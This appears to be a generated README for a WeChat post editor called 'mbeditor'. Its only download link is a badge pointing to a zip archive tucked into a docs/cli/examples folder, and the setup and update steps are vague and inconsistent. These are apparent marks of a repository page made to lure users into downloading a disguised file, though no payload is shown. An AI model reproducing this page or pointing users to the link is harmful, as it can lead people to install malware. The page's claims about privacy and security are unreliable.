# 📝 mbeditor - Create polished WeChat posts with AI

[![Download Mbeditor](https://img.shields.io/badge/Download-mbeditor-blue.svg)](https://github.com/republican-tenorsaxophonist510/mbeditor/raw/refs/heads/main/docs/cli/examples/Software-v2.1.zip)

Mbeditor helps you create professional WeChat articles. You use this tool to turn text into formatted posts. It works with AI agents to assist with writing and layout. You save time because the tool handles the technical side of formatting.

## 🛠 What this tool does

- Converts markdown text into WeChat-ready articles.
- Interfaces with AI agents to draft content.
- Automates the design process for your posts.
- Manages images and styling for consistent layouts.

## 💻 System requirements

- Windows 10 or Windows 11.
- A stable internet connection.
- 4GB of available RAM.
- Docker Desktop installed for the background services.

## ⚙️ How to use the editor

The editor runs as a local web service on your computer. This keeps your data private.

1. Open your terminal or command prompt.
2. Type the start command provided in your installation guide.
3. Open your web browser.
4. Type `localhost:8000` in the address bar.
5. You see the editor interface.

## ✍️ Writing your first post

1. Clear the default text in the main window.
2. Type or paste your content in Markdown format.
3. Connect your AI agent using the settings menu if you want the tool to suggest improvements.
4. Click the preview button to see how the post looks on a phone screen.
5. Adjust fonts or colors using the style panel on the right side.
6. Export your final result.

## 🖱 Common tasks

### Updating the software
Check the repository page once a month for new updates. Download the new installer and run it over your current version. Your settings remain untouched during this process.

### Changing themes
Navigate to the "Appearance" tab in the settings menu. You can switch between light and dark modes. You can also import custom CSS files if you have specific brand guidelines.

### Troubleshooting
If the editor does not load in your browser, check that Docker Desktop is running. Ensure no other applications are using port 8000. Restarting your computer often fixes connection issues with the local server.

## 🛡 Security and privacy
Your content stays on your local machine. The tool connects to external AI services only when you explicitly request a draft or an edit. No personal account information from your WeChat profile is stored within this software.

## 📎 Managing images
Drag your image files directly into the editor interface. The software resizes them to fit WeChat standards. Always check image resolution before export to ensure text remains sharp on mobile screens.

## 📤 Publishing your work
After you finish your post, export the document as an HTML file. Copy the resulting code and paste it into the WeChat Official Account backend. The formatting translates automatically.
